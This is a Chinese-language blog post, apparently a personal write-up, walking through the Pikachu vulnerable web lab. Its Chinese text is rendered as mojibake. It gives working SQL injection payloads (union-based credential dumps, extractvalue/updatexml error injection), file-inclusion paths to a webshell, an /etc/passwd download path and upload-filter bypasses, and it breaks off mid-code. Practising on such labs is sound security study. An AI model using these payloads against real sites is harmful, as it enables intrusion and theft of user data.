<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Pikachuæ‰“é¶éšè®° | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"é”®å…¥ä»¥ç»§ç»­","blurHolder":"æ•°æ®æ£€ç´¢","noResult":"æ—  $0 ç›¸å…³æ•°æ®"},"code":{"codeInfo":"$0 - å…± $1 è¡Œ","copy":"å¤åˆ¶","copyFinish":"å¤åˆ¶æˆåŠŸ","expand":"å±•å¼€"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="æ•°æ®æ£€ç´¢" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Pikachuæ‰“é¶éšè®°</h1><div id="post-info"><span>æ–‡ç« å‘å¸ƒæ—¶é—´: <div class="control"><time datetime="2023-06-18T07:06:21.000Z" id="date"> 2023-06-18</time></div></span><br><span>æœ€åæ›´æ–°æ—¶é—´: <div class="control"><time datetime="2023-06-30T08:29:52.927Z" id="updated"> 2023-06-30</time></div></span></div></div><hr><div id="post-content"><p>è¿™ç¯‡æ–‡ç« çš„é¶åœºæ˜¯Pikachu</p>
<span id="more"></span>

<h1 id="Sqlæ³¨å…¥"><a href="#Sqlæ³¨å…¥" class="headerlink" title="Sqlæ³¨å…¥"></a>Sqlæ³¨å…¥</h1><h2 id="ç¬¬ä¸€å…³-æ•°å­—å‹æ³¨å…¥ï¼ˆPostï¼‰"><a href="#ç¬¬ä¸€å…³-æ•°å­—å‹æ³¨å…¥ï¼ˆPostï¼‰" class="headerlink" title="ç¬¬ä¸€å…³ æ•°å­—å‹æ³¨å…¥ï¼ˆPostï¼‰"></a>ç¬¬ä¸€å…³ æ•°å­—å‹æ³¨å…¥ï¼ˆPostï¼‰</h2><p>BurpsuiteæŠ“åŒ…ç„¶åä¿®æ”¹å‚æ•°æ³¨å…¥å³å¯</p>
<h2 id="ç¬¬äºŒå…³-å­—ç¬¦å‹æ³¨å…¥ï¼ˆGetï¼‰"><a href="#ç¬¬äºŒå…³-å­—ç¬¦å‹æ³¨å…¥ï¼ˆGetï¼‰" class="headerlink" title="ç¬¬äºŒå…³ å­—ç¬¦å‹æ³¨å…¥ï¼ˆGetï¼‰"></a>ç¬¬äºŒå…³ å­—ç¬¦å‹æ³¨å…¥ï¼ˆGetï¼‰</h2><p>åŒæ ·ä¿®æ”¹å‚æ•°nameè¿›è¡Œæ³¨å…¥å³å¯</p>
<h2 id="ç¬¬ä¸‰å…³-æœç´¢å‹æ³¨å…¥"><a href="#ç¬¬ä¸‰å…³-æœç´¢å‹æ³¨å…¥" class="headerlink" title="ç¬¬ä¸‰å…³ æœç´¢å‹æ³¨å…¥"></a>ç¬¬ä¸‰å…³ æœç´¢å‹æ³¨å…¥</h2><p>è¿™ä¸€å…³éœ€è¦å¥½å¥½è®°å½•ä¸€ä¸‹ï¼Œé‡åˆ°äº†ä¸€ç§æ–°çš„æ³¨å…¥ï¼Œ</p>
<p>ä¹‹å‰æˆ‘ä»¬åˆ¤æ–­é—­åˆçš„æ–¹å¼æ˜¯å•å¼•å·æˆ–åŒå¼•å·+nä¸ªæ‹¬å·ï¼Œ</p>
<p>ä½†æ˜¯åœ¨è¿™é‡Œä½ å°±ä¼šå‘ç°ï¼Œä»–æ˜¯å•å¼•å·é—­åˆåŠ ä¸Šçš„ä¸æ˜¯æ‹¬å·ï¼Œ</p>
<p>å¯¼è‡´ä½ æ€ä¹ˆä¹Ÿè¯•ä¸å‡ºæ¥ï¼Œæ— å¥ˆä¹‹ä¸‹çœ‹äº†ä¸€ä¸‹åˆ«äººçš„writeupï¼š</p>


<p>Likeè¯­å¥æˆ‘ä¹‹å‰sqlæ³¨å…¥å­¦ä¹ ç¬”è®°#17ä»‹ç»è¿‡äº†</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¦é—­åˆï¼Œåº”è¯¥æ˜¯  â€œ  %â€™  â€</p>
<p>é‚£ä¹ˆä¹‹åçš„å°±ä¸€æ ·äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?name=1%&#x27;) order by 2--+&amp;submit=%E6%9F%A5%E8%AF%A2   è·å–å­—æ®µæ•°<br><br>1%&#x27;) union select 1,2--+&amp;submit=%E6%9F%A5%E8%AF%A2   æ³¨å‡ºå›æ˜¾ç‚¹<br><br>?name=1%&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;submit=%E6%9F%A5%E8%AF%A2 è·å–æ•°æ®åº“ä¸­çš„è¡¨æ ¼<br><br>?name=1%&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+&amp;submit=%E6%9F%A5%E8%AF%A2  è·å–è¡¨æ ¼ä¸­çš„åˆ—å<br><br>?name=1%&#x27;) union select 1,group_concat(id,username,password,level) from users--+&amp;submit=%E6%9F%A5%E8%AF%A2  è·å–åˆ—åä¸‹çš„æ•°æ®<br></code></pre></td></tr></table></figure>

<h2 id="ç¬¬å››å…³-xxå‹æ³¨å…¥"><a href="#ç¬¬å››å…³-xxå‹æ³¨å…¥" class="headerlink" title="ç¬¬å››å…³ xxå‹æ³¨å…¥"></a>ç¬¬å››å…³ xxå‹æ³¨å…¥</h2><p>è¿™ä¸€å…³ä¼°è®¡æ˜¯ä¸æƒ³å‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯ä»€ä¹ˆæ³¨å…¥å§ã€‚ã€‚ã€‚</p>
<p>ä½†æ˜¯ä»–ä¼¼ä¹å’Œä¸Šé¢çš„å­—ç¬¦å‹æ³¨å…¥åŒç†ï¼Œåªä¸è¿‡æ˜¯é—­åˆæ˜¯å•å¼•å·+æ‹¬å·</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">name=&#x27;) union select 1,2 --+&amp;submit=%E6%9F%A5%E8%AF%A2<br></code></pre></td></tr></table></figure>

<p>å‰©ä¸‹çš„å°±éƒ½ä¸€æ ·äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?name=1&#x27;) union select 1,group_concat(id,username,password,level) from users--+&amp;submit=%E6%9F%A5%E8%AF%A2   æœ€åä¸€æ­¥è·å–å…¨éƒ¨æ•°æ®<br></code></pre></td></tr></table></figure>

<h2 id="ç¬¬äº”å…³-insertã€updateæ³¨å…¥"><a href="#ç¬¬äº”å…³-insertã€updateæ³¨å…¥" class="headerlink" title="ç¬¬äº”å…³ insertã€updateæ³¨å…¥"></a>ç¬¬äº”å…³ insertã€updateæ³¨å…¥</h2><p>è¿™ä¸ªæ³¨å…¥ä¹‹å‰ä¹Ÿå·²ç»åœ¨å­¦ä¹ ç¬”è®°é‡Œé¢è®²è¿‡äº†ï¼Œ</p>
<p>åº”è¯¥æ˜¯åœ¨httpå¤´ä¸‹æ³¨å…¥çš„é‚£ä¸€ç¯‡ï¼Œç®€å•è®²ä¸€ä¸‹åŸç†</p>
<hr>
<p>åŸæ¥çš„è¯­å¥æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;$username&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>

<p>ç„¶åæ„é€ æˆ‘ä»¬çš„payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)#<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼ŒåŸæ¥çš„è¯­å¥å°±å˜æˆäº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)#&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>

<p>å»æ‰æ³¨é‡Šåé¢çš„å†…å®¹ï¼Œå¯ä»¥ç†è§£ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)<br></code></pre></td></tr></table></figure>

<hr>
<p>ç°åœ¨ç†è®ºè®²å®Œäº†ï¼Œå®æ“ä¸€ä¸‹å§ï¼Œ</p>
<p>é¦–å…ˆæ¥åˆ°pikachuçš„insertã€updateæ³¨å…¥é¶åœºï¼Œç‚¹å‡»ä¸‹é¢çš„æ³¨å†Œï¼Œ</p>
<p>å› ä¸ºåªæœ‰æ³¨å†Œæ‰ä¼šæ¶‰åŠåˆ°insertå‡½æ•°ï¼Œ</p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰6è¡Œï¼Œå› æ­¤è¦æ„é€ 6ä¸ªå‚æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4,5,6)#<br></code></pre></td></tr></table></figure>

<p>äºæ˜¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å¾—åˆ°å›æ˜¾ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">XPATH syntax error: &#x27;~pikachu&#x27;<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥çš„è¯­å¥ï¼Œå°±æ˜¯åœ¨ä¸Šé¢çš„payloadçš„0x7eåé¢ä¿®æ”¹æ³¨å…¥è¯­å¥äº†</p>
<h2 id="ç¬¬å…­å…³-deleteæ³¨å…¥"><a href="#ç¬¬å…­å…³-deleteæ³¨å…¥" class="headerlink" title="ç¬¬å…­å…³ deleteæ³¨å…¥"></a>ç¬¬å…­å…³ deleteæ³¨å…¥</h2><p>æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œç•™è¨€ä¹‹åä¼šå‡ºç°ä¸€ä¸ªâ€œåˆ é™¤â€æŒ‰é’®ï¼Œ</p>
<p>é‚£æ³¨å…¥ç‚¹ä¸å°±æ¥äº†å—ğŸ‘burpæŠ“ä¸€ä¸‹åŒ…</p>


<p>å‡ºç°äº†idå­—æ ·ï¼Œå¼€å§‹æ„é€ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">57+or+updatexml(1,concat(0x7e,database()),1)<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆå†™ç©ºæ ¼ä¸è¡Œè¦å†™â€œ+â€å·ï¼Ÿ</p>
<p>å¹¶ä¸”åœ¨æœ¬åœ°MySQLæµ‹è¯•ä¸­ï¼Œç©ºæ ¼æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯åŠ å·ä¼šæŠ¥é”™</p>


<hr>
<p>æ€è€ƒäº†ä¸€ä¸‹ï¼Œè§‰å¾—åº”è¯¥æ˜¯ç¨‹åºä¼šè¿‡æ»¤ç©ºæ ¼ï¼Œurlä¼šè‡ªåŠ¨æŠŠåŠ å·è½¬ä¹‰ä¸ºç©ºæ ¼</p>
<h2 id="ç¬¬ä¸ƒå…³-httpå¤´æ³¨å…¥"><a href="#ç¬¬ä¸ƒå…³-httpå¤´æ³¨å…¥" class="headerlink" title="ç¬¬ä¸ƒå…³ httpå¤´æ³¨å…¥"></a>ç¬¬ä¸ƒå…³ httpå¤´æ³¨å…¥</h2><p>è¿™ä¸ªä¹‹å‰ä¹Ÿè®²è¿‡äº†ï¼Œè¿™é‡Œå°±ç®€å•çœ‹çœ‹ï¼Œ</p>
<p>åŸç†å’Œä¸Šé¢çš„insertæ³¨å…¥åŸç†ç›¸åŒ</p>
<hr>
<p>è¿™ä¸ªé¶åœºæ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸‡èƒ½å¯†ç ï¼Œ</p>
<p>å¤±è´¥äº†ï¼Œç„¶åå°±æ˜¯å°è¯•httpå¤´æ³¨å…¥äº†ï¼Œ</p>
<p>ä½†æ˜¯æˆ‘ä»¬é¦–å…ˆéœ€è¦è·å–è´¦å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼Œ</p>
<p>ç‚¹å¼€å³ä¸Šè§’æç¤ºå°±æœ‰äº†</p>
<hr>
<p>ç„¶åå°±å¯ä»¥å¼€å§‹æ³¨å…¥äº†ï¼Œè¿™é‡Œæœ‰4ä¸ªåœ°æ–¹å¯ä»¥æ³¨å…¥ï¼š</p>


<p>æˆ‘è¿™é‡Œå°±é€‰æ‹©uaæ³¨å…¥äº†</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27; #<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–°çš„payloadä¸ä¹‹å‰ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸éœ€è¦çŸ¥é“ä¸€å…±æœ‰å‡ ä¸ªå‚æ•°ï¼Œ</p>
<p>ä»£å…¥åˆ°è¯­å¥ä¹‹åï¼Œæ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>

<p>åŒæ ·å¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~pikachu&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="ç¬¬å…«-ä¹å…³-ç›²æ³¨"><a href="#ç¬¬å…«-ä¹å…³-ç›²æ³¨" class="headerlink" title="ç¬¬å…«,ä¹å…³ ç›²æ³¨"></a>ç¬¬å…«,ä¹å…³ ç›²æ³¨</h2><p>ç›²æ³¨è¿™ä¸ªç®—äº†å§æ‡’å¾—æäº†</p>
<h2 id="ç¬¬åå…³-å®½å­—èŠ‚æ³¨å…¥"><a href="#ç¬¬åå…³-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="ç¬¬åå…³ å®½å­—èŠ‚æ³¨å…¥"></a>ç¬¬åå…³ å®½å­—èŠ‚æ³¨å…¥</h2><p>payloadåŒå‰é¢çš„å­—ç¬¦å‹æ³¨å…¥ï¼Œ</p>
<p>åœ¨æ¯ä¸ªpayloadçš„æœ€å‰é¢æ·»åŠ ä¸€ä¸ª%dfå³å¯</p>
<h1 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h1><h2 id="LFI-Local-File-Include"><a href="#LFI-Local-File-Include" class="headerlink" title="LFI(Local File Include)"></a>LFI(Local File Include)</h2><p>å¸¦ä½ å¼€ç¬¬ä¸€å…³ï¼Œéšä¾¿é€‰æ‹©ä¸€ä¸ªç¯®çƒå·¨æ˜Ÿï¼Œurlå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=æäº¤æŸ¥è¯¢<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸å°±æ˜¯å¦¥å¦¥çš„æ–‡ä»¶åŒ…å«æ¼æ´å—ï¼Ÿï¼</p>
<p>æŠŠshell.phpæ”¾åˆ°æ ¹ç›®å½•ç„¶åï¼Œæ„é€ è¯­å¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?filename=../../../shell.php&amp;submit=æäº¤æŸ¥è¯¢<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘å‰äº†3ä¸ªç›®å½•ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ ¹ç›®å½•ä¸æ˜¯åœ¨ä¸¤ä¸ªç›®å½•å‰å—ï¼Ÿ</p>
<p>ä»”ç»†çœ‹ä¸€ä¸‹å‘å‰ä¸¤ä¸ªç›®å½•çš„æŠ¥é”™ä¿¡æ¯ï¼š</p>


<p>æ–‡ä»¶çš„ä»£ç æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">include/$filename<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„é‚£ä¸ªâ€œ &#x2F; â€ï¼Œä»£è¡¨ä»–å‘å‰äº†ä¸€ä¸ªç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬è¦å‘åä¸€ä¸ªç›®å½•æŠµæ¶ˆï¼</p>
<h2 id="RFI-Remote-File-Include"><a href="#RFI-Remote-File-Include" class="headerlink" title="RFI(Remote File Include)"></a>RFI(Remote File Include)</h2><p>è¿œç¨‹æ–‡ä»¶åŒ…å«ä¸€æ ·å¾ˆç®€å•ï¼Œåªéœ€è¦æŠŠæœ¬åœ°æ–‡ä»¶ç›®å½•æ¢æˆè¿œç¨‹urlå³å¯</p>
<p>è¿™é‡Œç”¨pythonå¼€å¯ä¸€ä¸ªwebæœåŠ¡æµ‹è¯•ä¸€ä¸‹</p>


<p>æˆåŠŸï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«çš„ç‰¹æ€§æ¥æ‰§è¡Œéphpæ ¼å¼çš„webshell</p>


<h1 id="æ–‡ä»¶ä¸‹è½½æ¼æ´"><a href="#æ–‡ä»¶ä¸‹è½½æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸‹è½½æ¼æ´"></a>æ–‡ä»¶ä¸‹è½½æ¼æ´</h1><p>è®¤è¯†ä¸€ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¦‚è¿°ï¼š<br>    æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚å ä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚ å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚<br>    æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚ <br>    æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚ åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼ <br>    ä½ å¯ä»¥é€šè¿‡â€œUnsafe file downloadâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚ <br></code></pre></td></tr></table></figure>

<p>æˆ‘çš„ç†è§£æ˜¯burpæŠ“åŒ…ä¿®æ”¹éœ€è¦ä¸‹è½½çš„æ–‡ä»¶çš„è·¯å¾„ç„¶åä¸‹è½½æœ¬æ— æ³•ä¸‹è½½çš„æ–‡ä»¶</p>
<p>è¯•ä¸€ä¸‹</p>


<p>okï¼</p>
<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><h2 id="Client-Check"><a href="#Client-Check" class="headerlink" title="Client Check"></a>Client Check</h2><p>â€œå‰ç«¯çš„éªŒè¯å°±æ˜¯çº¸è€è™ï¼Œåªéœ€è¦burpsuiteä¾¿å¯è½»æ¾æ…ç ´â€</p>
<p>â€‹																						â€”â€”â€”â€”ä¸­å›½å“²äººVincent</p>
<hr>
<p>bpæŠ“åŒ…æ”¹åç¼€ï¼Œï¼Œï¼ŒæˆåŠŸä¸Šä¼ ï¼Œç»“æŸ</p>
<h2 id="Mime-Type"><a href="#Mime-Type" class="headerlink" title="Mime Type"></a>Mime Type</h2><p>â€œMime TypeéªŒè¯å°±æ˜¯çº¸è€è™ï¼Œåªéœ€è¦GIF89aä»¥åŠContent-type: image&#x2F;gifä¾¿å¯è½»æ¾æ…ç ´â€</p>
<p>â€‹                                                                                       â€”â€”â€”â€”ä¸­å›½å“²äººVincent</p>
<hr>
<p>å°±æ˜¯åœ¨webshellå‰é¢åŠ ä¸ªGIF89aç„¶ååŒä¸Šé¢çš„æ“ä½œå³å¯</p>
<p>wcç¿»è½¦äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ä¸Šä¼ çš„å›¾ç‰‡åªèƒ½æ˜¯jpg,jpeg,pngæ ¼å¼çš„ï¼<br></code></pre></td></tr></table></figure>

<p>ä¸è®©æˆ‘ä¸Šä¼ gifçš„ï¼Œæ²¡äº‹é—®é¢˜ä¸å¤§ï¼Œç»•è¿‡æ–¹å¼ä¸€æ ·</p>


<h2 id="Get-Image-Size"><a href="#Get-Image-Size" class="headerlink" title="Get Image Size"></a>Get Image Size</h2><p>çœ‹ä¸€ä¸‹æºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$type</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<span class="hljs-comment">//æŒ‡å®šç±»å‹</span><br>    <span class="hljs-variable">$mime</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpg&#x27;</span>,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>);<br>    <span class="hljs-variable">$save_path</span>=<span class="hljs-string">&#x27;uploads&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;/Y/m/d/&#x27;</span>);<span class="hljs-comment">//æ ¹æ®å½“å¤©æ—¥æœŸç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹</span><br>    <span class="hljs-variable">$upload</span>=<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-string">&#x27;uploadfile&#x27;</span>,<span class="hljs-string">&#x27;512000&#x27;</span>,<span class="hljs-variable">$type</span>,<span class="hljs-variable">$mime</span>,<span class="hljs-variable">$save_path</span>);<span class="hljs-comment">//è°ƒç”¨å‡½æ•°</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$upload</span>[<span class="hljs-string">&#x27;return&#x27;</span>])&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p 